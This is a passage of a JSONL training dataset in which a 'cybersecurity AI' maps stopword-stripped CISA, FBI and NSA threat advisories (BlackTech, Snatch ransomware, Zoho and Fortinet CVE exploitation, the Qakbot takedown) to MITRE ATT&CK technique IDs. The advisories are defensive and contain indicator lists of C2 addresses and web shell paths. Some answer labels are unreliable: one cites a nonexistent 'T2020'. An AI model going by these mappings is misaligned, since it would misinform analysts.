systemsnote adversary unauthorized privileged level access network device could revert configuration change3 monitor inbound outbound connections network devices external internal systems general network devices connecting nearby devices exchanging routing network topology information administrative systems time synchronization logging authentication monitoring etc feasible block unauthorized outbound connections network devices applying access lists rule sets nearby network devices additionally place administrative systems separate virtual local area networks vlans block unauthorized traffic network devices destined nonadministrative vlans4 limit access administration services permit ip addresses used network administrators applying access lists vty lines specific services monitor logs successful unsuccessful login attempts login onfailure log login onsuccess log configuration commands reviewing centralized authentication authorization accounting aaa events3 upgrade devices ones secure boot capabilities better integrity authenticity checks bootloaders firmware particular highly prioritize replacing endoflife unsupported equipment soon possible35 concern single password compromised change passwords keys3 review logs generated network devices monitor unauthorized reboots operating system version changes changes configuration attempts update firmware compare expected configuration changes patching plans verify changes authorized3 periodically perform file memory verification described network device integrity ndi methodology documents detect unauthorized changes software stored running network devices3 monitor changes firmware periodically take snapshots boot records firmware compare known good images3 works cited1 joint csa peoples republic china statesponsored cyber actors exploit network providers devices httpsmediadefensegov2022jun072003013376110csaprcsponsoredcyberactorsexploitnetworkprovidersdevicestlpwhitepdf2 joint csa peoples republic china statesponsored cyber actor living land evade detection httpsmediadefensegov2023may242003229517110csaprcstatesponsoredcyberlivingoffthelandv11pdf3 nsa network infrastructure security guide httpsmediadefensegov2022jun152003018261110ctrnsanetworkinfrastructuresecurityguide20220615pdf4 nsa performing outofband network management httpsmediadefensegov2020sep172002499616110performingoutofbandnetworkmanagement20200911pdf5 cisco attackers continue target legacy devices httpscommunityciscocomt5securityblogsattackerscontinuetotargetlegacydevicesbap4169954 disclaimer endorsement information opinions contained document provided without warranties guarantees reference herein specific commercial products process service trade name trademark manufacturer otherwise constitute imply endorsement recommendation favoring united states government japan guidance shall used advertising product endorsement purposes trademark recognition cisco cisco ios registered trademarks cisco technology incfreebsd registered trademark freebsd foundationlinux registered trademark linus torvaldsmitre mitre attck registered trademarks mitre corporationwindows registered trademark microsoft corporation purpose document developed furtherance authoring agencies cybersecurity missions including responsibilities identify disseminate cyber threats develop issue cybersecurity specifications mitigations contact nsa cybersecurity report questions feedback cybersecurityreportsnsagovnsas defense industrial base inquiries cybersecurity services dibdefensecybernsagovnsa media inquiries press desk 4436340721 mediarelationsnsagov us organizations organizations also report anomalous cyber activity andor cyber incidents 247 toreportcisagovor calling 1844saycisa 18447292472 andor fbi via local fbi field office appendix mitre attck techniques see tables 29 referenced blacktech tactics techniques advisory product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1021.001, T1071.002, T1090, T1090.002, T1112, T1199, T1553.002, T1562, T1562.001, T2020"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: actions take today mitigate malicious cyber activity secure closely monitor remote desktop protocol rdp maintain offline backups data enable enforce phishingresistant multifactor authentication mfa summary note joint cybersecurity advisory csa part ongoing stopransomware effort publish advisories network defenders detail various ransomware variants ransomware threat actors stopransomware advisories include recently historically observed tactics techniques procedures ttps indicators compromise iocs help organizations protect ransomware visit stopransomwaregov see stopransomware advisories learn ransomware threats nocost resources federal bureau investigation fbi cybersecurity infrastructure security agency cisa releasing joint csa disseminate known ransomware iocs ttps associated snatch ransomware variant identified fbi investigations recently june 1 2023 since mid2021 snatch threat actors consistently evolved tactics take advantage current trends cybercriminal space leveraged successes ransomware variants operations snatch threat actors targeted wide range critical infrastructure sectors including defense industrial base dib food agriculture information technology sectors snatch threat actors conduct ransomware operations involving data exfiltration double extortion data exfiltration often involving direct communications victims demanding ransom snatch threat actors may threaten victims double extortion victims data posted snatchs extortion blog ransom goes unpaid fbi cisa encourage organizations implement recommendations mitigations section csa reduce likelihood impact ransomware incidents download pdf version report aa23263apdf pdf 57871 kb downloadable copy iocs see aa23263a stix xml xml 7984 kb aa23263a stix json json 5610 kb technical details note advisory uses mitre attck enterprise framework version 13 see mitre attck tactics techniques section table threat actors activity mapped mitre attck tactics techniques assistance mapping malicious cyber activity mitre attck framework see cisa mitre attcks best practices mitre attck mapping cisas decider tool first appearing 2018 snatch operates ransomwareasaservice raas model claimed first usbased victim 2019 originally group referred team truniger based nickname key group member truniger previously operated gandcrab affiliate snatch threat actors use customized ransomware variant notable rebooting devices safe mode enabling ransomware circumvent detection antivirus endpoint protection encrypting files services running snatch threat actors observed purchasing previously stolen data ransomware variants attempt exploit victims paying ransom avoid data released snatchs extortion blog note since november 2021 extortion site operating name snatch served clearinghouse data exfiltrated stolen victim companies clearnet tor hosted bulletproof hosting service august 2023 individuals claiming associated blog gave media interview claiming blog associated snatch ransomware none targets attacked ransomware snatch despite multiple confirmed snatch victims data appearing blog alongside victims associated ransomware groups notably nokoyawa conti1 initial access persistence snatch threat actors employ several different methods gain access maintain persistence victims network snatch affiliates primarily rely exploiting weaknesses remote desktop protocol rdp bruteforcing gaining administrator credentials victims networks instances snatch affiliates sought compromised credentials criminal forumsmarketplaces snatch threat actors gain persistence victims network compromising administrator account establishing connections port 443 command control c2 server located russian bulletproof hosting service per ip traffic event logs provided recent victims snatch threat actors initiated rdp connections russian bulletproof hosting service virtual private network vpn services data discovery lateral movement snatch threat actors observed using different ttps discover data move laterally search data exfiltrate snatch threat actors use scexe configure query stop start delete add system services using windows command line addition scexe snatch threat actors also use tools metasploit cobalt strikes0154 prior deploying ransomware snatch threat actors observed spending three months victims system within timeframe snatch threat actors exploited victims network moving laterally across victims network rdp largest possible deployment ransomware searching files folders data exfiltration followed file encryption defense evasion execution early stages ransomware deployment snatch threat actors attempt disable antivirus software run executable file named safeexe variation thereof recent victims ransomware executables name consisted string hexadecimal characters match sha256 hash file effort defeat rulebased detection upon initiation snatch ransomware payload queries modifies registry keys uses various native windows tools enumerate system finds processes creates benign processes execute windows batch bat files instances program attempts remove volume shadow copies system execution batch files executable removes batch files victims filesystem snatch ransomware executable appends series hexadecimal characters file folder name encryptsunique infectionand leaves behind text file titled restore filestxt folder snatch threat actors communicate victims email tox communication platform based identifiers left ransom notes extortion blog since november 2021 victims reported receiving spoofed call unknown female claimed association snatch directed groups extortion site instances snatch victims different ransomware variant deployed systems received ransom note snatch threat actors result victims data posted ransomware blog involving different ransomware variant snatch threat actors extortion blog indicators compromise iocs snatch iocs detailed section obtained fbi investigations september 2022 june 2023 email domains addresses since 2019 snatch threat actors used numerous email addresses email victims email addresses used snatch threat actors random usually originate one following domains listed tables 1 2 table 2 shows list legitimate email domains offering encrypted email services used snatch threat actors email domains publicly available legal use email domains threat actor attributed email domains absent specific articulable facts tending show used direction control threat actor email addresses listed table 3 reported recent victims mitre attck tactics techniques see tables 416 referenced threat actor tactics techniques advisory mitigations fbi cisa recommend organizations implement mitigations improve organizations cybersecurity posture basis snatch threat actors activity mitigations align crosssector cybersecurity performance goals cpgs developed cisa national institute standards technology nist cpgs provide minimum set practices protections cisa nist recommend organizations implement cisa nist based cpgs existing cybersecurity frameworks guidance protect common impactful threats tactics techniques procedures visit cisas crosssector cybersecurity performance goals information cpgs including additional recommended baseline protections reduce threat malicious actors using remote access tools auditing remote access tools network identify currently used andor authorized software reviewing logs execution remote access software detect abnormal use programs running portable executablecpg 2t using security software detect instances remote access software loaded memory requiring authorized remote access solutions used within network approved remote access solutions virtual private networks vpns virtual desktop interfaces vdis blocking inbound outbound connections common remote access software ports protocols network perimeter implement application controls manage control execution software including allowlisting remote access programs application controls prevent installation execution portable versions unauthorized remote access software properly configured application allowlisting solution block unlisted application execution allowlisting important antivirus solutions may fail detect execution malicious portable executables files use combination compression encryption obfuscation strictly limit use rdp remote desktop services rdp necessary rigorously apply best practices examplecpg 2w audit network systems using rdp close unused rdp ports enforce account lockouts specified number attempts apply phishingresistant multifactor authentication mfa log rdp login attempts disable commandline scripting activities permissionscpg 2n review domain controllers servers workstations active directories new andor unrecognized accountscpg 4c audit user accounts administrative privileges configure access controls according principle least privilege polpcpg 2e reduce threat credential compromise via following place domain admin accounts protected users group prevent caching password hashes locally refrain storing plaintext credentials scripts implement timebased access accounts set admin level highercpg 2a 2e addition authoring authorities csa recommend network defenders apply following mitigations limit potential adversarial use common system network discovery techniques reduce impact risk compromise ransomware data extortion actors implement recovery plan maintain retain multiple copies sensitive proprietary data servers physically separate segmented secure location ie hard drive storage device cloud maintain offline backups data regularly maintain backup restoration daily weekly minimum instituting practice organization limits severity disruption business practicescpg 2r require accounts password logins eg service account admin accounts domain admin accounts comply nists standards developing managing password policies use longer passwords consisting least eight characters 64 characters lengthcpg 2b store passwords hashed format using industryrecognized password managers add password user salts shared login credentials avoid reusing passwordscpg 2c implement multiple failed login attempt account lockoutscpg 2g disable password hints refrain requiring password changes frequently per yearnote nist guidance suggests favoring longer passwords instead requiring regular frequent password resets frequent password resets likely result users developing password patterns cyber criminals easily decipher require administrator credentials install software require phishingresistant multifactor authentication mfa services extent possible particularly webmail virtual private networks vpns accounts access critical systemscpg 2h keep operating systems software firmware date timely patching one efficient costeffective steps organization take minimize exposure cybersecurity threats prioritize patching known exploited vulnerabilities internetfacing systemscpg 1e segment networks prevent spread ransomware network segmentation help prevent spread ransomware controlling traffic flows betweenand access tovarious subnetworks restricting adversary lateral movementcpg 2f identify detect investigate abnormal activity potential traversal indicated ransomware networking monitoring tool aid detecting ransomware implement tool logs reports network traffic activity including lateral movement network endpoint detection response edr tools particularly useful detecting lateral connections insight common uncommon network connections hostcpg 3a install regularly update enable real time detection antivirus software hosts disable unused ports protocolscpg 2v consider adding email banner emails received outside organizationcpg 2m disable hyperlinks received emails ensure backup data encrypted immutable ie ensure backup data altered deleted covers entire organizations data infrastructurecpg 2k 2l 2r validate security controls addition applying mitigations fbi cisa recommend exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory fbi cisa recommend testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory see tables 416 align security technologies technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process fbi cisa recommend continually testing security program scale production environment ensure optimal performance mitre attck techniques identified advisory resources stopransomwaregov wholeofgovernment approach gives one central location ransomware resources alerts resource mitigate ransomware attack stopransomware guide nocost cyber hygiene services cyber hygiene services ransomware readiness assessment reporting fbi seeking information shared include boundary logs showing communication ip addresses sample ransom note communications snatch threat actors bitcoin wallet information decryptor files andor benign sample encrypted file fbi cisa strongly discourage paying ransom payment guarantee victim files recovered furthermore payment may also embolden adversaries target additional organizations encourage criminal actors engage distribution ransomware andor fund illicit activities regardless whether organization decided pay ransom fbi cisa urge promptly report ransomware incidents fbi internet crime complaint center ic3 ic3gov local fbi field office cisa reportcisagov 1844saycisa 18447292472 references1 databreachesnet disclaimer information report provided informational purposes fbi cisa endorse commercial entity product service including subjects analysis reference specific commercial products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring fbi cisa version history september 20 2023 initial version product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1005, T1012, T1021.001, T1036, T1057, T1059.003, T1070.004, T1071.001, T1078, T1078.002, T1110.001, T1112, T1133, T1486, T1490, T1562.001, T1569.002, T1583.003, T1590"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: actions take today mitigate malicious cyber activity patch systems known exploited vulnerabilities kevs including firewall security appliances monitor unauthorized use remote access software using endpoint detection tools remove unnecessary disabled accounts groups enterprise longer needed especially privileged accounts summary cybersecurity infrastructure security agency cisa federal bureau investigation fbi cyber national mission force cnmf identified presence indicators compromise iocs aeronautical sector organization early january 2023 analysts confirmed nationstate advanced persistent threat apt actors exploited cve202247966 gain unauthorized access publicfacing application zoho manageengine servicedesk plus establish persistence move laterally network vulnerability allows remote code execution manageengine application additional apt actors also observed exploiting cve202242475 establish presence organizations firewall device cisa cosealers releasing joint cybersecurity advisory csa provide network defenders tactics techniques procedures ttps iocs methods detect protect similar exploitation download pdf version report aa23250a actors exploit cve202247966 cve202242475 pdf 68149 kb downloadable copy iocs see aa23250a stix xml xml 6924 kb aa23250a stix json json 6989 kb downloadable copy malware analysis report mar accompanying csa see mar104303111v1 multiple nationstate threat actors exploit cve202247966 cve202242475 pdf 38549 kb note advisory uses mitre attck enterprise framework version 13 see tables 313 apt actors activity mapped mitre attck tactics techniques corresponding mitigation andor detection recommendations overview request impacted organization cisa conducted incident response engagement february april 2023 cisa cosealers assess beginning early january 2023 multiple nationstate apt actors present organizations network via least two initial access vectors initial access vector 1 apt actors exploited cve202247966 access organizations web server hosting publicfacing application zoho manageengine servicedesk plus initial access vector 2 apt actors exploited cve202242475 access organizations firewall device cisa cosealers identified array threat actor activity include overlapping ttps across multiple apt actors per activity conducted apt actors often scan internetfacing devices vulnerabilities easily exploited firewall virtual private networks vpns edge network infrastructure continue interest malicious cyber actors targeted leveraged expand targeted network access serve malicious infrastructure mixture apt actor activity initial access vector 1 early january 2023 apt actors exploited cve202247966 initial access organizations web server hosting publicfacing application zoho manageengine servicedesk plus cisa observed indications log files connection known malicious ip address 192142226153 made part initial exploitation exploitation cve202247966 apt actors achieved root level access web server created local user account named azure administrative privileges actors able download malware enumerate network collect administrative user credentials move laterally organizations network cisa cosealers unable determine proprietary information accessed altered exfiltrated due organization clearly defining data centrally located cisa limited network sensor coverage initial access vector 2 additional apt actors exploited cve202242475 organizations firewall device indicated multiple successful vpn connections knownmalicious ips february 116 2023 identified apt actors compromised used disabled legitimate administrative account credentials previously hired contractorof organization confirmed user disabled prior observed activity analysis identified common behavior threat actors use disabled administrative account credentials delete logs several critical servers environment prevented ability detect followon exploitation data exfiltration cisa cosealers also unable track activity due organization network address translation nat ip logging enabled apt actors initiated multiple transport layer security tlsencrypted sessions transmission control protocol tcp port 10443 indicating successful exchanges data transfer firewall device apt actors observed connecting device following actorcontrolled c2 ip addresses 144202271 207246105240 4577121232 4790240218 apt actors leveraged legitimate credentials move firewall web server multiple web shells loadedamong locations owa serverinto following directories note following file paths web shells received coordination trusted thirdparty however artifacts received analysis cprogram filesmicrosoft office web appsrootwebsiteenusresourceaspx cinetpubwwwrootredactedcssfontawesomecssdiscoverashx cinetpubwwwrootredactedcssfontawesomecssconfigloginashx cprogram filescommon filesmicrosoft sharedweb server extensions15templatelayoutsapproveinfoaspx cprogram filesmicrosoft office web appsrootwebsiteinfosaspx cprogram filesmicrosoft office web appsrootwebsiteerrorinfoaspx cprogram filesmicrosoft office web appsrootwebsiteinfosashx cprogram filesmicrosoft office web appsrootwebsiteenuserroraspx cprogram filesmicrosoft office web appsrootwebsiteenusinfosaspx cprogram filesmicrosoft office web appsrootwebsiteenusinfoaspx cprogram filesmicrosoft office web appsrootwebsiteenusinfo1aspx cprogram filesmicrosoft office web appsrootwebsiteenusnewlistaspx cprogram filesmicrosoft office web appsrootwebsiteenuserrorinfoaspx cprogram filesmicrosoft office web appsrootwebsiteenuslgnbotrashx cinetpubpasswordchange0lecpnjyrhaspx cinetpubpasswordchange9ehjaspx cinetpubwwwrootwssvirtualdirectoriesportal80vtipvtservicesinfoashx cinetpubwwwrootwssvirtualdirectoriesportal80vtipvtservicesaspx cinetpubredirectedsitesredactedproductsuns1fwaspx cinetpubredirectedsitesredactedproductsuns1ewaspx following ip addresses identified associated loaded web shells 4590123194 15469126 15469322 1546935 15469312 15469332 15469324 18417024127 1919610640 102129145232 forensic timeline apt actor activity tables 1 2 list timeline events discovered incident response well tools used apt actors conduct operations respectively timestamps presented coordinated universal time utc postengagement analysis extended analysts unable determine additional actions taken apt actors likely due lack sensor coverage data unavailability data available determined apt actors used tools listed table 2 operations mitre attck tactics techniques see tables 313for referenced apt actors tactics techniques enterprise environments advisory assistance mapping malicious cyber activity mitre attck framework see cisa mitre attcks best practices mitre attck mapping cisas decider tool detection methods cisa cosealers recommend reviewing tables 313 identified attck techniques enterprise conjunction detections section identify similar activity enable logging new user creationds0002 well monitor executed commands arguments actions associated local account creation net user add useradd dscl createds0017 monitor newly constructed scheduled tasks enabling microsoftwindowstaskscheduleroperational setting within event logging service monitor changes made scheduled tasks may attempt manipulate features artifacts make appear legitimate benign users andor security toolsds0003 monitor api calls may create modify windows services ex createservicew repeatedly execute malicious payloads part persistenceds0009 monitor executed commands arguments may attempt access credential material stored process memory lsassds0017 monitor user accounts logged systems associated rdp ex windows eid 4624 logon type 10ds0028 monitor newlyconstructed network connections associated pingsscans may attempt collect listing systems ip address hostname logical identifier network may used lateral movement current systemds0029 conduct full port scans 165535 internetfacing systemsnot subset ports mitigations note mitigations align crosssector cybersecurity performance goals cpgs developed cisa national institute standards technology nist cpgs provide minimum set practices protections cisa nist recommend organizations implement cisa nist based cpgs existing cybersecurity frameworks guidance protect common impactful threats tactics techniques procedures visit cisas crosssector cybersecurity performance goals information cpgs including additional recommended baseline protections manage vulnerabilities configurationscpg 1e cpg 3a cisa cosealers identified exploitation cve202247966 granted initial access publicfacing application zoho manageengine servicedesk plus multiple zoho manageengine onpremises products servicedesk plus 14003 allow remote code execution due use version 141 apache xml security java also known xmlsec apache santuario project due xmlsec xslt features design version application responsible certain security protections cisa cosealers recommend following document device configurationscpg 2o organizations maintain updated documentation describing current configuration details critical assets ot applicable facilitates effective vulnerability response activities keep software date patch systems known exploited vulnerabilities places known exploited vulnerabilities endpoint device eg firewall security appliances conduct investigation prior patchingcpg 1e follow routine patching cyclem1051 operating systems applications software including thirdparty software mitigate potential exploitation prioritize remediation vulnerabilities internetfacing systems example conducting continuous automated andor routine vulnerability scansm1016cisa offers range services cost including scanning testing help organizations reduce exposure threats via mitigating attack vectors specifically cyber hygiene services help provide secondset eyes organizations internetaccessible assets organizations email vulnerabilitycisadhsgov subject line requesting cyber hygiene services get started additional guidance remediating vulnerabilities seecisa insights remediate vulnerabilities internetaccessible systems deploy securitytxt filescpg 4c publicfacing web domains securitytxt file conforms recommendations rfc 91169 segment networkscpg 2f cisa cosealers identified organization employ proper network segmentation demilitarized zone dmz initial discovery phase incident response dmz serves perimeter network protects adds extra layer security organizations internal local area network lan untrusted traffic employ proper network segmentation dmz ensure address following recommendations note end goal dmz network allow organization access untrusted networks internet ensuring private network lan remains secure organizations typically store externalfacing services resources well servers dns file transfer protocol ftp mail proxy voice internet protocol voip web servers dmzcpg 2k cpg 2w limit internetfacing port exposure critical resources dmz networks limit exposed ports required ip addresses avoid placing wildcards destination port host entries ensure unsecured protocols like ftp http limited use restricted specific ip ranges data flows untrusted zone trusted zone ensure conducted secure protocol like https mandatory multifactor authentication use firewall webapplication firewall waf enable logging preventdetect potential exploitation attemptsm1050 review ingress egress firewall rules block unapproved protocols limit risky approved protocols rules use waf limit exposure approved ports well monitor file changes web directories implement network segmentation separate network segments based role functionality proper network segmentation significantly reduces ability threat actor lateral movement controlling traffic flows betweenand access tovarious subnetworks see cisas layering network security segmentation infographic national security agencys nsas segment networks deploy applicationaware defenses manage accounts permissions workstations apt actors able leverage disabled administrative accounts well clear logs several critical servers prevented ability detect followon exploitation data exfiltration cisa cosealers recommend following use phishingresistant multifactor authentication mfacpg 2h eg security tokens remote access access sensitive data repositories implement phishingresistant mfa many services possibleparticularly webmail vpnsfor accounts access critical systems privileged accounts manage backups mfa also used remote loginsm1032 additional guidance secure mfa configurations visit cisagovmfa cisas implementing phishingresistant mfa factsheet employ strong password management alongside attributebased information device information time access user history geolocation data set password policy require complex passwords users minimum 16 characters enforce new requirement users passwords expirecpg 2a cpg 2b cpg 2c implement principle least privilege decrease threat actors abilities access key network resources limit ability local administrator account log local interactive sessioncpg 2e eg deny access computer network prevent access via rdp session establish policy procedure prompt removal unnecessary disabled accounts groups enterprise longer needed especially privileged accounts implement enforce use local administrator password solution laps control limit local administration ensuring administrative users access systems outside local machine across domain create change control process privilege escalations role changes user accounts enable alerts privilege escalations role changes well log privileged user changes network environment create alerts abnormal events create deploy secure system baseline image workstations see microsofts guidance using security baselines organization implement policies block workstationtoworkstation rdp connectionscpg 2v group policy object windows similar mechanism rdp service disabled unnecessarym1042 secure remote access software remote access software provides proactive flexible approach organizations internally oversee networks computers devices however cyber threat actors increasingly coopt tools access victim systems apt actors observed using legitimate remote access toolsconnectwise screenconnect anydeskto connect victim hosts within organizations environment conduct malicious operations cisa cosealers recommend following establish software behavior baseline detect anomalies behaviorcpg 2t cpg 2u monitor unauthorized use remote access software using endpoint detection tools information see cisas joint guide securing remote access software best practices using remote capabilities detect defend malicious actors abusing software best practice mitigation recommendations use application allowlists domain controllers administrative hosts sensitive systems following exploitation publicfacing application zoho manageengine servicedesk plus apt actors able download execute multiple files system utilized enumerate network perform reconnaissance operations use directory allowlisting rather attempting list every possible permutation applications network environment safe defaults allow applications run programfiles programfilesx86 system32 disallow locations unless exception granted documented application directory allowlisting enabled microsoft software restriction policy applocker prevent execution unauthorized software audit scheduled tasks validate findings via group policy object gpo endpoint detection response edr solution follow microsofts best practices securing active directory review nsas network infrastructure security guide validate security controls addition applying mitigations cisa cosealers recommend exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory cisa cosealers also recommend testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory see tables 313 align security technologies technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process cisa cosealers recommend continually testing security program scale production environment ensure optimal performance mitre attck techniques identified advisory resources nist nvd cve202247966 nist nvd cve202242475 cisa kev list mitre attck enterprise v131 cisa mitre best practices mitre attck mapping cisa decider tool cisa crosssector cybersecurity performance goals cisa cyber hygiene services cisa remediate vulnerabilities internetaccessible systems cisa layering network security segmentation nsa segment networks deploy applicationaware defenses cisa mfa cisa implementing phishingresistant mfa microsoft using security baselines organization cisa guide securing remote access software microsoft best practices securing active directory nsa network infrastructure security guide disclaimer information report provided informational purposes cisa fbi cnmf endorse commercial entity product company service including entities products services linked within document reference specific commercial entities products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring cisa fbi cnmf references snort known malicious useragent string mirai mitre mimikatz mitre ngrok aa22320a iranian governmentsponsored apt actors compromise federal network deploy crypto miner credential harvester aa22294a stopransomware daixin team aa23075a stopransomware lockbit 30 github interactsh microsoft quser internet engineering task force ietf rfc 9116 version history september 7 2023 initial version product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1190"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary cybersecurity infrastructure security agency cisa federal bureau investigation fbi releasing joint cybersecurity advisory csa disseminate qakbot infrastructure indicators compromise iocs identified fbi investigations august 2023 august 25 fbi international partners executed coordinated operation disrupt qakbot infrastructure worldwide disruption operations targeting qakbot infrastructure resulted botnet takeover severed connection victim computers qakbot command control c2 servers fbi working closely industry partners share information malware maximize detection remediation prevention measures network defenders cisa fbi encourage organizations implement recommendations mitigations section reduce likelihood qakbotrelated activity promote identification qakbotfacilitated ransomware malware infections note disruption qakbot infrastructure mitigate previously installed malware ransomware victim computers potential compromise detected administrators apply incident response recommendations included csa report key findings local fbi field office cisa cisagovreport download pdf version report aa23242a identification disruption qakbot infrastructure pdf 57050 kb downloadable copy iocs see aa23242a stix xml xml 5162 kb aa23242a stix json json 4312 kb technical details overview qakbotalso known qbot quackbot pinkslipbot ta570is responsible thousands malware infections globally qakbot precursor significant amount computer intrusions include ransomware compromise user accounts within financial sector existence since least 2008 qakbot feeds global cybercriminal supply chain deeprooted connections criminal ecosystem qakbot originally used banking trojan steal banking credentials account compromise cases delivered via phishing campaigns containing malicious attachments links download malware would reside memory victim network since initial inception banking trojan qakbot evolved multipurpose botnet malware variant provides threat actors wide range capabilities include performing reconnaissance engaging lateral movement gathering exfiltrating data delivering malicious payloads including ransomware affected devices qakbot maintained persistence digital environment modular nature access qakbotaffected victim devices via compromised credentials often sold goals threat actor delivered qakbot qakbot affiliated variants targeted united states global infrastructures including financial services emergency services commercial facilities sectors election infrastructure subsector fbi cisa encourage organizations implement recommendations mitigations section csa reduce likelihood qakbotrelated infections promote identification qakbotinduced ransomware malware infections disruption qakbot botnet mitigate previously installed malware ransomware victim computers potential compromise detected administrators apply incident response recommendations included csa report key findings cisa fbi qakbot infrastructure qakbots modular structure allows various malicious features including process web injection victim network enumeration credential stealing delivery followon payloads cobalt strike1 brute ratel malware qakbot infections particularly known precede deployment humanoperated ransomware including conti2 prolock3 egregor4 revil5 megacortex6 black basta7 royal8 pwndlocker historically qakbots c2 infrastructure relied heavily using hosting providers infrastructure malicious activity providers lease servers malicious threat actors ignore abuse complaints cooperate law enforcement given time thousands victim computers running microsoft windows infected qakbotthe botnet controlled three tiers c2 servers figure 1 qakbots tiered c2 servers first tier c2 servers includes subset thousands bots selected qakbot administrators promoted tier 1 supernodes downloading additional software module supernodes communicate victim computers relay commands communications upstream c2 servers infected computers midjune 2023 853 supernodes identified 63 countries active month supernodes observed frequently changing assists qakbot evading detection network defenders bot observed communicating set tier 1 supernodes relay communications tier 2 c2 servers serving proxies conceal main c2 server tier 3 server controls bots indicators compromise fbi observed following threat actor tactics techniques procedures ttps association oakbot infections qakbot sets persistence via registry run key needed delete key running set back computer restart hkeycurrentusersoftwaremicrosoftwindowscurrentversionrunrandomstring qakbot also write binary back disk maintain persistence following folder cusersuserappdataroamingmicrosoftrandomstring qakbot write encrypted registry configuration detailing information bot following registry key hkeycurrentusersoftwaremicrosoftrandomstring addition ip addresses assessed obtained access victim computers organizations encouraged review connections ip addresses could potentially indicate qakbot andor followon malware infection disclaimer ip addresses assessed inactive august 29 2023 several observed ip addresses first observed early 2020 although date 2022 2023 historically linked qakbot fbi cisa recommend ip addresses investigated vetted organizations prior taking action blocking organizations also encouraged review qbotqakbot malware presentation us department health human services cybersecurity program additional information mitre attck techniques detailed associated software descriptions tactics used groups observed using software see mitre attcks page qakbot9 mitigations note situational awareness following sha256 hash associated fbis qakbot uninstaller 7cdee5a583eacf24b1f142413aabb4e556ccf4ef3a4764ad084c1526cc90e117 cisa fbi recommend network defenders apply following mitigations reduce likelihood qakbotrelated activity promote identification qakbotinduced ransomware malware infections disruption qakbot botnet mitigate alreadyinstalled malware ransomware victim computers note mitigations align crosssector cybersecurity performance goals cpgs developed cisa national institute standards technology nist cpgs provide minimum set practices protections cisa nist recommend organizations implement cisa nist based cpgs existing cybersecurity frameworks guidance protect common impactful threats ttps visit cisas crosssector cybersecurity performance goals information cpgs including additional recommended baseline protections best practice mitigation recommendations implement recovery plan maintain retain multiple copies sensitive proprietary data servers physically separate segmented secure location ie hard drive storage device cloudcpg 2o 2r 5a require accounts password logins eg service accounts admin accounts domain admin accounts comply nists standards developing managing password policiescpg 2b includes use longer passwords consisting least 8 characters 64 characters length store passwords hashed format using industryrecognized password managers add password user salts shared login credentials avoid reusing passwords implement multiple failed login attempt account lockouts disable password hints refrain requiring password changes frequently per yearnote nist guidance suggests favoring longer passwords instead requiring regular frequent password resets frequent password resets likely result users developing password patterns cyber criminals easily decipher require administrator credentials install software use phishingresistant multifactor authentication mfacpg 2h eg security tokens remote access access sensitive data repositories implement phishingresistant mfa many services possibleparticularly webmail vpnsfor accounts access critical systems privileged accounts manage backups mfa also used remote logins additional guidance secure mfa configurations visit cisagovmfa cisas implementing phishingresistant mfa factsheet keep operating systems software firmware date timely patching one efficient costeffective steps organization take minimize exposure cybersecurity threats prioritize patching known exploited vulnerabilities internetfacing systemscpg 1e cisa offers range services cost including scanning testing help organizations reduce exposure threats via mitigating attack vectors specifically cyber hygiene services help provide secondset eyes organizations internetaccessible assets organizations email vulnerabilitycisadhsgov subject line requesting cyber hygiene services get started segment networks prevent spread ransomware network segmentation help prevent spread ransomware controlling traffic flows betweenand access tovarious subnetworks restrict adversary lateral movementcpg 2f identify detect investigate abnormal activity potential traversal indicated malware networking monitoring tool aid detecting malware implement tool logs reports network traffic including lateral movement activity network endpoint detection response edr tools particularly useful detecting lateral connections insight common uncommon network connections hostcpg 3a install regularly update enable real time detection antivirus software hosts review domain controllers servers workstations active directories new andor unrecognized accounts audit user accounts administrative privileges configure access controls according principle least privilegecpg 2d 2e disable unused portscpg 2v 2w 2x consider adding email banner emails received outside organization disable hyperlinks received emails implement timebased access accounts set admin level higher example justintime access method provisions privileged access needed support enforcement principle least privilege well zero trust model process networkwide policy set place automatically disable admin accounts active directory level account direct need individual users may submit requests automated process grants access specified system set timeframe need support completion certain taskcpg 2e disable commandline scripting activities permissions privilege escalation lateral movement often depend software utilities running command line threat actors able run tools difficulty escalating privileges andor moving laterally perform regular secure system backups create known good copies device configurations repairs andor restoration store copies offnetwork physically secure locations test regularlycpg 2r ensure backup data encrypted immutable ie altered deleted covers entire organizations data infrastructure ransomware guidance cisagovstopransomware wholeofgovernment resource serves one central location ransomware resources alerts cisa fbi national security agency nsa multistate information sharing analysis center msisac published updated version stopransomware guide ransomware actors accelerated tactics techniques since initial release 2020 cisa released new module cyber security evaluation tool cset ransomware readiness assessment rra cset desktop software tool guides network defenders stepbystep process evaluate cybersecurity practices networks validate security controls addition applying mitigations cisa fbi recommend exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory cisa fbi also recommend testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory see mitre attcks page qakbot9 align security technologies technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process cisa fbi recommend continually testing security program scale production environment ensure optimal performance mitre attck techniques reporting fbi seeking information shared include boundary logs showing communication foreign ip addresses sample ransom note communications qakbotaffiliated actors bitcoin wallet information decryptor files andor benign sample encrypted file fbi cisa encourage paying ransom payment guarantee victim files recovered furthermore payment may also embolden adversaries target additional organizations encourage criminal actors engage distribution ransomware andor 